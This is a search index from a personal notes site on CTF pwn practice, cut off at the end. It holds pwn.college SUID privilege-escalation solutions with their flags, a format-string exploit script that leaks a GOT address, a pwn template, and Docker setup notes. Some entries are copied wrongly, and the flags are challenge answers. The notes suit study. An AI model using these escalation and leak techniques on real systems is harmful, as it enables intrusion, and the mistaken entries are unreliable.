{"keys":[{"path":["title"],"id":"title","weight":1,"src":"title"},{"path":["body"],"id":"body","weight":1,"src":"body"}],"records":[{"i":0,"$":{"0":{"v":"This page has not yet sprouted","n":0.408},"1":{"v":"[Dendron](https://dendron.so/) (the tool used to generate this site) lets authors selective publish content. You will see this page whenever you click on a link to an unpublished page\n\n![](https://foundation-prod-assetspublic53c57cce-8cpvgjldwysl.s3-us-west-2.amazonaws.com/assets/images/not-sprouted.png)","n":0.189}}},{"i":1,"$":{"0":{"v":"b1babo's note","n":0.707},"1":{"v":"\nwrite and record something.\n","n":0.5}}},{"i":2,"$":{"0":{"v":"Computer","n":1}}},{"i":3,"$":{"0":{"v":"Security","n":1}}},{"i":4,"$":{"0":{"v":"Pwn College","n":0.707}}},{"i":5,"$":{"0":{"v":"Program Misuse","n":0.707},"1":{"v":"\n\n\n## Challenges\n\n### 如何开始做题\n```sh\n/challenge/babysuid_level1\n```\n### 解题思路\n根据这个章节的名字可知：程序的错误使用，某个可执行程序（通常为系统中常见的程序）被设置了suid位，设置了suid位的程序能够以该程序所有者的权限执行程序，因此如果程序所有者为root则能够以root权限执行，可完成提权，读取root文件等操作\n\n\n### babysuid-level1\n`/usr/bin/cat`被设置suid\n```sh\ncat /flag\n# pwn.college{IIrsGeCfQOMDxkMJjv325KWhdRR.QXzQTMsQDMyMzW}\n```\n### babysuid-level2\n`/usr/bin/more`被设置suid\n```sh\nmore /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level3\n`/usr/bin/less`被设置suid\n```sh\nless /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n### babysuid-level4\n`/usr/bin/tail`被设置suid\n```sh\ntail /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n### babysuid-level5\n`/usr/bin/head`被设置suid\n```sh\nhead /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level6\n`/usr/bin/sort`被设置suid\n```sh\nsort /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level7\n`/usr/bin/vim`被设置suid\n```sh\nvim /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level8\n`/usr/bin/emacs`被设置suid\n```sh\nemacs /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level9\n`/usr/bin/nano`被设置suid\n```sh\nnano /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level10\n`/usr/bin/rev`被设置suid\n```sh\nrev /flag | rev\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level11\n`/usr/bin/od`被设置suid\n\n打印八进制数，需要\n```sh\nod /flag\n\n0000000  30576  11886  28515  27756  26469  31589  28267  27719\n0000020  22099  21361  24936  29287  27467  13363  27714  25929\n0000040  25680  20022  26188  11861  22609  21882  19796  20851\n0000060  19780  19833  22394   2685\n0000070\n```\n打印字符，是否可以写入文件\n```sh\nod /flag -c\n0000000   p   w   n   .   c   o   l   l   e   g   e   {   k   n   G   l\n0000020   S   V   q   S   h   a   g   r   K   k   3   4   B   l   I   e\n0000040   P   d   6   N   L   f   U   .   Q   X   z   U   T   M   s   Q\n0000060   D   M   y   M   z   W   }  \\n\n0000070\n```\n\n### babysuid-level12\n`/usr/bin/hd`被设置suid\n```sh\nhd /flag \n00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 6b 56 69 61  |pwn.college{kVia|\n00000010  44 61 51 41 57 51 70 62  66 51 68 6e 66 47 6e 77  |DaQAWQpbfQhnfGnw|\n00000020  64 47 30 75 73 4a 67 2e  51 58 30 55 54 4d 73 51  |dG0usJg.QX0UTMsQ|\n00000030  44 4d 79 4d 7a 57 7d 0a                           |DMyMzW}.|\n00000038\n```\n\n### babysuid-level13\n`/usr/bin/xxd`被设置suid\n```sh\nxxd /flag \n00000000: 7077 6e2e 636f 6c6c 6567 657b 5144 5548  pwn.college{QDUH\n00000010: 6f31 6970 7761 6f7a 2d71 5730 3461 5133  o1ipwaoz-qW04aQ3\n00000020: 6844 466a 795a 6c2e 5158 3155 544d 7351  hDFjyZl.QX1UTMsQ\n00000030: 444d 794d 7a57 7d0a                      DMyMzW}.\n```\n\n\n### babysuid-level14\n`/usr/bin/base32 `被设置suid\n```sh\nbase32 /flag | base32 -d\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level15\n`/usr/bin/base64 `被设置suid\n```sh\nbase64 /flag | base64 -d\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level16\n`/usr/bin/split `被设置suid\n`split`可将文件分割，默认分割名字前缀为`x`则分割后文件名为`xaa xab`\n```sh\nsplit /flag \ncat /xaa\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level17\n`/usr/bin/gzip `\n```sh\ngzip /flag\n# flag.gz 仍是root只可读\ngzip /flag.gz -d -c\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n\n### babysuid-level18\n`/usr/bin/bzip2 `\n```sh\nbzip2 -z /flag\n# flag.bz2 仍是root只可读\nbzip2 -d -c /flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n### babysuid-level19\n`/usr/bin/zip `是否改成其他用户可读\n```sh\nzip z /flag.zip\n#-rw-r--r-- 1 root hacker 214 Nov  9 00:16 /z.zip\n# z.zip hacker可读\nunzip /z.zip\n# 将z.zip解压到hacker目录，其中的文件flag hacker可读\n#r-------- 1 hacker hacker 56 Nov  9 00:08 flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```\n\n\n### babysuid-level20\n`/usr/bin/tar `是否改成其他用户可读\n```sh\nzip z /flag.zip\n#-rw-r--r-- 1 root hacker 214 Nov  9 00:16 /z.zip\n# z.zip hacker可读\nunzip /z.zip\n# 将z.zip解压到hacker目录，其中的文件flag hacker可读\n#r-------- 1 hacker hacker 56 Nov  9 00:08 flag\n# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}\n```","n":0.056}}},{"i":6,"$":{"0":{"v":"Ctf","n":1}}},{"i":7,"$":{"0":{"v":"Pwn","n":1}}},{"i":8,"$":{"0":{"v":"Wp","n":1}}},{"i":9,"$":{"0":{"v":"Njctf2017_pingme","n":1},"1":{"v":"\n\n```py\n\nfrom pwn import * \nimport os\n# ========================================\nis_debug = False\nis_debug = True\narchitecture = {\"arch\":\"i386\",\"os\":\"linux\",\"endian\":\"little\",\"bits\":64}\narchitecture = {\"arch\":\"amd64\",\"os\":\"linux\",\"endian\":\"little\",\"bits\":32}\n# is_remote = True\nis_remote = False\nip = \"\"\nport = \"\"\ntarget = \"./pingme\"\ntarget_libc = \"\"\nenv = []\n\n# ========================================\ndef _which(p):\n    return os.system(\"which \" + p + \" >/dev/null 2>&1\") == 0\n\n\n\n# ========================================\nif is_debug:\n    context.log_level='debug'\nelse:\n    context.log_level='info'\ncontext(os=architecture[\"os\"],arch=architecture[\"arch\"],bits=architecture[\"bits\"])\nelf = \"\"\nlibc = \"\"\nif target:\n    context.binary = target\n    elf = ELF(target)\nif target_libc:\n    libc = ELF(target_libc)\n\nif _which(\"tmux\"):\n    terminal = ['tmux', 'splitw', '-h']\nelif _which('gnome-terminal'):\n    terminal = ['tmux', '--', 'sh', '-c']\nelse:\n    terminal = None\ncontext.terminal = terminal\n\nif is_remote:\n    while True:\n        try:\n            io=remote(ip,port)\n        except:\n            log.info(\"remote:too many requests,I am tried,sleep one second please\")\n            sleep(0x10)\n            continue\n        break\nelse:\n    while True:\n        try:\n            io=process(target)\n        except:\n            log.info(\"local:too many process,I can not malloc any memory\")\n            log.info(\"bye~~\")\n            exit()\n        break\n\ndef debug(gdbscript=\"\", stop=False):\n    if isinstance(io, process):\n        if stop:\n            pause()\n        gdb.attach(io, gdbscript=gdbscript)\n\nstop = pause\nS = pause\nleak = lambda name, address: log.info(\"{{}} ===> {{}}\".format(name, hex(address)))\ns   = io.send\nsl  = io.sendline\nsla = io.sendlineafter\nsa  = io.sendafter\nslt = io.sendlinethen\nst  = io.sendthen\nr   = io.recv\nrn  = io.recvn\nrr  = io.recvregex\nru  = io.recvuntil\nra  = io.recvall\nrl  = io.recvline\nrs  = io.recvlines\nrls = io.recvline_startswith\nrle = io.recvline_endswith\nrlc = io.recvline_contains\nia  = io.interactive\nic  = io.close\ncr  = io.can_recv\n\n\n\nbuffer_padding = lambda offset : offset*'A'\n\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = io.recv()\n    return info\n# auto = FmtStr(exec_fmt)\n# offset = auto.offset\n# fmtstr_payload(7, {printf_got: system_addr})\n\ndef DynELF_leak(addr):\n    p = process(target)\n    p.recvline()\n    payload = b\"%9$s.AAA\" + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:-4] \n    log.info(\"leaking: 0x%x --> %s\" % (addr, data.hex()))\n    p.close()\n    return data\n# data = DynELF(DynELF_leak, elf.plt[\"printf\"],elf=elf)     # Entry point address\n# system_addr = data.lookup('system', 'libc')\n# printf_addr = data.lookup('printf', 'libc')\n# log.info(\"system address: 0x%x\" % system_addr)\n# log.info(\"printf address: 0x%x\" % printf_addr)\n\n\nfrom LibcSearcher import LibcSearcher\n# libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)\n# libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')\n# system_addr = libcbase + libc_searcher.dump('system')\n# binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')\n# libc_searcher = LibcSearcher('printf', printf_addr)\n# libcbase = printf_addr - libc_searcher.dump('printf')\n# system_addr = libcbase + libc_searcher.dump('system')\n\n# ========================================\n\n\nS()\n\n\n# debug(gdbscript=\"b *main\\r\\nb printf\")\n# print(hex(elf.got[\"printf\"]))\nprintf_got = elf.got[\"printf\"]\n# 数字在后面，前面为字符串，防止被截断，AAA在后面为了使用ru(\".AAA\")，利于定位，如果是\".AAA%9$s\",不利于定位\npayload = b\"%9$s.AAA\" + p32(printf_got)\nrl()\nsl(payload)\ndata = ru(\".AAA\")[:4]\nprintf_addr = u32(data)\nlog.info(\"printf address: %s\" % hex(printf_addr))\n\n\n\nia()\n# S()\n\n\n```","n":0.058}}},{"i":10,"$":{"0":{"v":"Template","n":1},"1":{"v":"\n## pwn题模板\n\n```py\nfrom pwn import * \nimport os\n# ========================================\nis_debug = False\nis_debug = True\narchitecture = {\"arch\":\"i386\",\"os\":\"linux\",\"endian\":\"little\",\"bits\":64}\narchitecture = {\"arch\":\"amd64\",\"os\":\"linux\",\"endian\":\"little\",\"bits\":32}\n# is_remote = True\nis_remote = False\nip = \"\"\nport = \"\"\ntarget = \"./pingme\"\ntarget_libc = \"\"\nenv = []\n\n# ========================================\ndef _which(p):\n    return os.system(\"which \" + p + \" >/dev/null 2>&1\") == 0\n\n\n\n# ========================================\nif is_debug:\n    context.log_level='debug'\nelse:\n    context.log_level='info'\ncontext(os=architecture[\"os\"],arch=architecture[\"arch\"],bits=architecture[\"bits\"])\nelf = \"\"\nlibc = \"\"\nif target:\n    context.binary = target\n    elf = ELF(target)\nif target_libc:\n    libc = ELF(target_libc)\n\nif _which(\"tmux\"):\n    terminal = ['tmux', 'splitw', '-h']\nelif _which('gnome-terminal'):\n    terminal = ['tmux', '--', 'sh', '-c']\nelse:\n    terminal = None\ncontext.terminal = terminal\n\nif is_remote:\n    while True:\n        try:\n            io=remote(ip,port)\n        except:\n            log.info(\"remote:too many requests,I am tried,sleep one second please\")\n            sleep(0x10)\n            continue\n        break\nelse:\n    while True:\n        try:\n            io=process(target)\n        except:\n            log.info(\"local:too many process,I can not malloc any memory\")\n            log.info(\"bye~~\")\n            exit()\n        break\n\ndef debug(gdbscript=\"\", stop=False):\n    if isinstance(io, process):\n        if stop:\n            pause()\n        gdb.attach(io, gdbscript=gdbscript)\n\nstop = pause\nS = pause\nleak = lambda name, address: log.info(\"{{}} ===> {{}}\".format(name, hex(address)))\ns   = io.send\nsl  = io.sendline\nsla = io.sendlineafter\nsa  = io.sendafter\nslt = io.sendlinethen\nst  = io.sendthen\nr   = io.recv\nrn  = io.recvn\nrr  = io.recvregex\nru  = io.recvuntil\nra  = io.recvall\nrl  = io.recvline\nrs  = io.recvlines\nrls = io.recvline_startswith\nrle = io.recvline_endswith\nrlc = io.recvline_contains\nia  = io.interactive\nic  = io.close\ncr  = io.can_recv\n\nbuffer_padding = lambda offset : offset*'A'\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = io.recv()\n    return info\n# auto = FmtStr(exec_fmt)\n# offset = auto.offset\n# fmtstr_payload(7, {printf_got: system_addr})\n\ndef DynELF_leak(addr):\n    p = process(target)\n    p.recvline()\n    payload = b\"%9$s.AAA\" + p32(addr)\n    p.sendline(payload)\n    data = p.recvuntil(\".AAA\")[:-4] \n    log.info(\"leaking: 0x%x --> %s\" % (addr, data.hex()))\n    p.close()\n    return data\n# data = DynELF(DynELF_leak, elf.plt[\"printf\"],elf=elf)     # Entry point address\n# system_addr = data.lookup('system', 'libc')\n# printf_addr = data.lookup('printf', 'libc')\n# log.info(\"system address: 0x%x\" % system_addr)\n# log.info(\"printf address: 0x%x\" % printf_addr)\n\n\nfrom LibcSearcher import LibcSearcher\n# libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)\n# libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')\n# system_addr = libcbase + libc_searcher.dump('system')\n# binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')\n# libc_searcher = LibcSearcher('printf', printf_addr)\n# libcbase = printf_addr - libc_searcher.dump('printf')\n# system_addr = libcbase + libc_searcher.dump('system')\n\n# ========================================\n\n\nS()\n\n\n# debug(gdbscript=\"b *main\\r\\nb printf\")\n# print(hex(elf.got[\"printf\"]))\nprintf_got = elf.got[\"printf\"]\npayload = b\"%9$s.AAA\" + p32(printf_got)\nrl()\nsl(payload)\ndata = ru(\".AAA\")[:4]\nprintf_addr = u32(data)\nlog.info(\"printf address: %s\" % hex(printf_addr))\n\n\nia()\n# S()\n```","n":0.058}}},{"i":11,"$":{"0":{"v":"Fmt_string","n":1},"1":{"v":"\n# 格式化字符串漏洞\n## 格式化输出函数和格式字符串用法\n\n### 格式化占位符\n\n`%[parameter][flags][field width][.precision][length]type`\n\n- parameter: n$,表示对应第几个参数，参数可以不同顺序输出，可被使用多次，从第1开始数，不包括格式化字符串本身\n```c\nprintf(\"%2$d %2$#x; %1$d %1$#x\",16,17)//\"17 0x11; 16 0x10\"\n``` \n- type\n```\n%d/i：4byte,解释为数值\n%u: 4byte,无符号，解释为数值\n%s: 4byte,解释为字符串指针，有解引用的效果\n%x/X: 4byte,解释为数值，打印16进制\n%c: 1byte,解释为值\n%p: 4byte，解释为数值\n%n: 不输出字符，把成功输出的字符个数（这个百分号之前的字符个数），将对应的参数解释为整型指针，并写入所指内存\n```\n- length\n```\nhh: 1byte\nh: 2byte\nl: 4byte\nll: 8byte\n```\n### 格式字符串用法\n```c\n//fmt_str_1.c\n// gcc -m32 -g fmt_str_1.c -o fmt_str_1_32\n#include<stdio.h>\n#include<stdlib.h>\nvoid main() {\n    char *format = \"%s\";\n    char *arg1 = \"Hello World!\\n\";\n    printf(format, arg1);\n    printf(\"%03d.%03d.%03d.%03d\\n\", 127, 0, 0, 1);    // \"127.000.000.001\"\n    printf(\"%.2f\\n\", 1.2345);   // 1.23\n    printf(\"%#010x\\n\", 3735928559);   // 0xdeadbeef\n    int n =0;\n    printf(\"%s%n\\n\", \"01234\", &n);  // n =5 \n    printf(\"%d\\n\",n);  // n = 5\n}\n```\n\n#### 调用printf时栈结构\n```c\n  0x56592222 <main+53>    lea    eax, [ebx - 0x1fc9]\n   0x56592228 <main+59>    mov    dword ptr [ebp - 0x10], eax\n   0x5659222b <main+62>    sub    esp, 8\n   0x5659222e <main+65>    push   dword ptr [ebp - 0x10]\n   0x56592231 <main+68>    push   dword ptr [ebp - 0x14]\n _ 0x56592234 <main+71>    call   printf@plt                    <printf@plt>\n        format: 0x56593008 __ 0x48007325 /* '%s' */\n        vararg: 0x5659300b __ 'Hello World!\\n'\n \n   0x56592239 <main+76>    add    esp, 0x10\n   0x5659223c <main+79>    sub    esp, 0xc\n   0x5659223f <main+82>    push   1\n   0x56592241 <main+84>    push   0\n   0x56592243 <main+86>    push   0\n```\n\n```c\n──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────\n00:0000│ esp 0xffce6b50 —▸ 0xffce6b84 ◂— '%08x.%08x.%08x.%08x.%08x'\n01:0004│     0xffce6b54 ◂— 0x1\n02:0008│     0xffce6b58 ◂— 0x88888888\n03:000c│     0xffce6b5c ◂— 0xffffffff\n04:0010│     0xffce6b60 —▸ 0xffce6b7a ◂— 'ABCD'\n05:0014│     0xffce6b64 —▸ 0xffce6b84 ◂— '%08x.%08x.%08x.%08x.%08x'\n06:0018│     0xffce6b68 —▸ 0xf7f92b50 —▸ 0xf7f92af0 —▸ 0xf7f5e3e0 —▸ 0xf7f92990 ◂— ...\n07:001c│     0xffce6b6c —▸ 0x80491f4 (main+30) ◂— add    ebx, 0x2e0c\n────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────\n ► f 0 0x804925f main+137\n   f 1 0xf7d82ed5 __libc_start_main+245\n\n```\n\n### 漏洞原理\n> 如果格式化字符串可控，怎么样的可控，可以导致什么效果，都必须清楚，效果可以分为几类：出错（奔溃），副作用（写内存，读内存），绕过某种判断，不按预期输出结果（导致其他用这个输出结果的地方存在问题\n> 如果输入参数可控，配合相应的格式化字符串对参数的解释，可导致任意内存读写\n\n\n- 格式字符串要求的参数和实际提供的参数不匹配，格式化字符串%的个数对应参数的个数，对于32位程序会取栈中的值作为参数，对于64位程序，取决于第几个参数\n- 已经push的参数类型（如果是数值类型，则直接将值复制到栈中，如果是字符串，则将地址复制到栈中）和不匹配的格式化字符格式，如果printf函数的参数可控\n- 格式化字符串提供了读，写原语\n- 读地址是否可控，读内容是否可控，是否可打印\n- 写地址是否可控，写内容是否可控\n\n\n\n\n### 如何利用\n#### 读原语\n```c\n//fmt_str_2.c\n//echo 0 > /proc/sys/kernel/randomize_va_space\n// gcc -m32 -g fmt_str_2.c -fno-stack-protector -no-pie -o fmt_str_2_32\n#include<stdio.h>\nvoid main() {\n    char format[128];\n    int arg1 = 1, arg2 = 0x88888888, arg3 = -1;\n    char arg4[10] = \"ABCD\";\n    scanf(\"%s\", format);\n    printf(format, arg1, arg2, arg3, arg4);\n    printf(\"\\n\");\n}\n```\n\n- 使用%s有解引用的效果，可以打印*p，如果p可控，则可以造成任意地址读，因此需要对输入参数可控，参数在栈中\n- 参数是第几位\n\n\n\n#### 写原语\n\n\n```c\n//fmt_str_2.c\n//echo 0 > /proc/sys/kernel/randomize_va_space\n// gcc -m32 -g fmt_str_2.c -fno-stack-protector -no-pie -o fmt_str_2_32\n#include<stdio.h>\nvoid main() {\n    char format[128];\n    int arg1 = 1, arg2 = 0x88888888, arg3 = -1;\n    char arg4[10] = \"ABCD\";\n    scanf(\"%s\", format);\n    printf(format, arg1, arg2, arg3, arg4);\n    printf(\"\\n\");\n}\n```\n\n\n\n#### 64位利用\n\n\n\n\n\n\n\n### 如何挖掘漏洞\n#### 代码审计\n- 对格式化输出函数敏感，梳理格式化字符串是否可控\n#### fuzz\n\n\n\n\n\n\n\n\n\n## 参考\n[wiki](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2)\n\n[ctf-all-in-one](https://firmianay.gitbook.io/ctf-all-in-one/3_topics/pwn/3.1.1_format_string)\n\n[ctf-wiki](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)","n":0.057}}},{"i":12,"$":{"0":{"v":"Ctf Docker","n":0.707},"1":{"v":"\n\n## docker file\n\n```docker\n# Dockerfile\n# FROM phusion/baseimage:master-amd64\n# FROM ubuntu:16.04\nFROM ubuntu:20.04\n\nENV DEBIAN_FRONTEND=noninteractive\n\nENV HTTP_PROXY=\"http://192.168.8.1:10811\"\n# apt setup\nENV UBUNTU_MIRROR=mirrors.tuna.tsinghua.edu.cn\nRUN  sed -i s@/archive.ubuntu.com/@/${UBUNTU_MIRROR}/@g /etc/apt/sources.list\nRUN  sed -i s@/security.ubuntu.com/@/${UBUNTU_MIRROR}/@g /etc/apt/sources.list\nRUN  apt-get clean  \nRUN  apt-get update\n\n# RUN  apt-get install \\\n#         python python3 \\\n#         python-pip python3-pip \\\n#         python-dev libffi-dev libssl-dev \\\n#         vim \\\n#         lib32ncurses5 lib32z1 \\\n#         ruby gem git \\\n#          -y\n\n# install some lib using apt\nRUN dpkg --add-architecture i386 && \\\n    apt-get -y update && \\\n    apt install -y \\\n    libc6:i386 \\\n    libc6-dbg:i386 \\\n    libc6-dbg \\\n    lib32stdc++6 \\\n    g++-multilib \\\n    cmake \\\n    ipython3 \\\n    vim \\\n    net-tools \\\n    iputils-ping \\\n    libffi-dev \\\n    libssl-dev \\\n    python3-dev \\\n    python3-pip \\\n    build-essential \\\n    ruby \\\n    ruby-dev \\\n    tmux \\\n    strace \\\n    ltrace \\\n    nasm \\\n    wget \\\n    gdb \\\n    gdb-multiarch \\\n    netcat \\\n    socat \\\n    git \\\n    patchelf \\\n    gawk \\\n    file \\\n    python3-distutils \\\n    bison \\\n    rpm2cpio cpio \\\n    zstd \\\n    tzdata --fix-missing && \\\n    rm -rf /var/lib/apt/list/*\n\n# timezone\nENV TZ=Asia/Shanghai\nRUN ln -fs /usr/share/zoneinfo/$TZ /etc/localtime && \\\n    dpkg-reconfigure -f noninteractive tzdata\n\n\n# python setup\nENV PIP_MIRROR=https://pypi.tuna.tsinghua.edu.cn/simple\n\n# RUN pip install -i ${PIP_MIRROR} \"pip < 21.0\" -U && pip3 install -i ${PIP_MIRROR}  \"pip < 21.0\" -U \nRUN python3 -m pip install -U pip -i ${PIP_MIRROR}\nRUN pip config set global.index-url ${PIP_MIRROR}\nRUN python3 -m pip install --no-cache-dir \\\n    ropgadget \\\n    z3-solver \\\n    smmap2 \\\n    apscheduler \\\n    ropper \\\n    unicorn \\\n    keystone-engine \\\n    capstone \\\n    angr \\\n    pebble \\\n    r2pipe \\\n    requests \\\n    pwntools\n\nRUN gem sources --remove https://rubygems.org/ && \\\n    gem sources -a http://gems.ruby-china.com/ && \\\n    gem install one_gadget seccomp-tools && \\\n    rm -rf /var/lib/gems/2.*/cache/*\n\n\n\n# git setup\nENV GIT_HTTP_PROXY=${HTTP_PROXY} \nRUN git config --global http.proxy ${GIT_HTTP_PROXY}\nRUN git clone --depth 1 https://github.com/pwndbg/pwndbg && \\\n    cd pwndbg && chmod +x setup.sh && ./setup.sh\n\nRUN git clone --depth 1 https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb && \\\n    cd ~/Pwngdb && mv .gdbinit .gdbinit-pwngdb && \\\n    sed -i \"s?source ~/peda/peda.py?# source ~/peda/peda.py?g\" .gdbinit-pwngdb && \\\n    echo \"source ~/Pwngdb/.gdbinit-pwngdb\" >> ~/.gdbinit\n\nRUN git clone https://github.com/lieanu/LibcSearcher.git && \\\n    cd LibcSearcher && \\\n    python3 setup.py develop\nRUN echo http_proxy=${HTTP_PROXY}  >> ~/.bashrc \n\n\nRUN git clone --depth 1 https://github.com/niklasb/libc-database.git libc-database && \\\n    cd libc-database && ./get ubuntu debian || echo \"/libc-database/\" > ~/.libcdb_path && \\\n    rm -rf /tmp/*\n\n# wget \n\nRUN http_proxy=${HTTP_PROXY}  wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py\n\n\n\nRUN mkdir /root/workspace\n\n```\n\n## run script\n\n```sh\n#!/bin/bash\n\n# ctf-docker.sh\nOWNERNAME=\"b1babo\"\nIMAGENAME=\"ctf-docker\"\nTAGNAME=\"v.1.0\"\nCONTAINERNAME=\"ctf\"\nPORTSTRING=\"\"\nif [ \"${PORTFWD}\" = \"\" ]\nthen\n   PORTFWD=\"20080:80,20443:443,28080:8080,24433:4433,9999:9999\"\nfi\nPORTFWD=$(echo ${PORTFWD} | tr -cd [0-9,:])\nIFS=',' read -ra PORTLIST <<< \"${PORTFWD}\"\nfor PORTPAIR in \"${PORTLIST[@]}\"\ndo\n   SPORT=$(echo ${PORTPAIR} | cut -d':' -f1)\n   PORTSTRING=\"${PORTSTRING} -p ${SPORT}:${SPORT}\"\ndone\n\n\n\n\nfunction build_image(){\n    echo [+] building $OWNERNAME/$IMAGENAME:$TAGNAME\n    DOCKER_BUILDKIT=1 docker build -t $OWNERNAME/$IMAGENAME:$TAGNAME -f Dockerfile .\n}\n\nfunction run_docker(){\n    echo [+] runing $OWNERNAME/$IMAGENAME:$TAGNAME ${PORTSTRING}\n    docker run -it  ${PORTSTRING} --name $CONTAINERNAME --mount \"type=bind,src=$(pwd)/workspace,dst=/root/workspace\" $OWNERNAME/$IMAGENAME:$TAGNAME \n        -e PORTFWD=\"${PORTFWD}\" \\\n        # --rm \\\n        --cap-add=NET_ADMIN \\\n        --cap-add=SYS_ADMIN \\\n        --security-opt apparmor=unconfined \\\n        --device=/dev/net/tun \\\n        --network=host \\\n        \n}\n\nfunction rm_image(){\n    docker container rm $IMAGENAME\n}\n\n\n# Handle arguments\nfunction show_help {\n    echo \"Usage: $0 [-b] [-r]\"\n    echo \"-b - build ctf docker image\"\n    echo \"-r - run ctf docker\"\n}\n\n\nif [[ $# < 1 ]]; then\n    show_help\n    exit 1\nfi\n\n\n# 选项后面的冒号表示需要参数\nwhile getopts \"brh\" optname\ndo\n    case \"$optname\" in\n      \"b\")\n        build_image\n        ;;\n      \"r\")\n        run_docker \n        ;;\n      \"h\")\n        echo \"Usage: $0 [-b] [-r]\"\n        ;;\n      *)\n        echo \"Unknown options\"\n        ;;\n    esac\n    #echo \"option index is $OPTIND\"\ndone\n\n```","n":0.045}}},{"i":13,"$":{"0":{"v":"Link Load","n":0.707},"1":{"v":"\n\n## got表\n> got是一个地址，一般jmp/call [addr]，[addr]包含了真正的外部的地址\n\n```\n.got.plt:08049964                               _got_plt segment dword public 'DATA' use32\n.got.plt:08049964                               assume cs:_got_plt\n.got.plt:08049964                               ;org 8049964h\n.got.plt:08049964 78 98 04 08                   off_8049964 dd offset stru_8049878      ; DATA XREF: _init_proc+9↑o\n.got.plt:08049964                                                                       ; init+9↑o\n.got.plt:08049964                                                                       ; _term_proc+9↑o\n.got.plt:08049968 00 00 00 00                   dword_8049968 dd 0                      ; DATA XREF: sub_80483E0↑r\n.got.plt:0804996C 00 00 00 00                   dword_804996C dd 0                      ; DATA XREF: sub_80483E0+6↑r\n.got.plt:08049970 AC 99 04 08                   off_8049970 dd offset setbuf            ; DATA XREF: _setbuf↑r\n.got.plt:08049974 B0 99 04 08                   off_8049974 dd offset printf            ; DATA XREF: _printf↑r\n.got.plt:08049978 B4 99 04 08                   off_8049978 dd offset fgets             ; DATA XREF: _fgets↑r\n.got.plt:0804997C B8 99 04 08                   off_804997C dd offset alarm             ; DATA XREF: _alarm↑r\n.got.plt:08049980 BC 99 04 08                   off_8049980 dd offset puts              ; DATA XREF: _puts↑r\n.got.plt:08049984 C0 99 04 08                   off_8049984 dd offset strchr            ; DATA XREF: _strchr↑r\n.got.plt:08049988 C4 99 04 08                   off_8049988 dd offset strlen            ; DATA XREF: _strlen↑r\n.got.plt:0804998C C8 99 04 08                   off_804998C dd offset __libc_start_main ; DATA XREF: ___libc_start_main↑r\n.got.plt:08049990 CC 99 04 08                   off_8049990 dd offset putchar           ; DATA XREF: _putchar↑r\n.got.plt:08049990                               _got_plt ends\n```\n\n## plt\n> plt是一个地址，一般是jmp/call addr，相当于外部符号在本elf的间接地址\n\n```\n.plt:08048400                               ; int printf(const char *format, ...)\n.plt:08048400                               _printf proc near                       ; CODE XREF: main+4D↓p\n.plt:08048400\n.plt:08048400                               format= dword ptr  4\n.plt:08048400\n.plt:08048400 FF 25 74 99 04 08             jmp     ds:off_8049974\n.plt:08048400\n.plt:08048400                               _printf endp\n```","n":0.072}}},{"i":14,"$":{"0":{"v":"Docker","n":1},"1":{"v":"\n\n## docker install \n\n\n```bash\nsudo pacman -Ss docker \n```\n\n \n## docker start\n\n启动\n\n```bash\nsudo systemctl  start docker\n```\n\n把用户加入docker用户组，无需每次输入sudo\n\n```bash\nsudo usermod -aG docker $USER\n# 需要 logout 重新登录\n```\n\n## 设置国内源\n\n新建或编辑daemon.json\n\n```bash\nvi /etc/docker/daemon.json\n```\n\n在daemon.json中编辑如下\n\n```json\n{\n\n \"registry-mirrors\": [\"http://hub-mirror.c.163.com\"]\n\n}\n```\n\n国内源\n\n```\n网易\nhttp://hub-mirror.c.163.com\nDocker中国区官方镜像\nhttps://registry.docker-cn.com\n中国科技大学\nhttps://docker.mirrors.ustc.edu.cn\n```\n\n## docker image\n\n文件生成的容器实例，本身也是一个文件，称为容器文件。也就是说，一旦容器生成，就会同时存在两个文件： 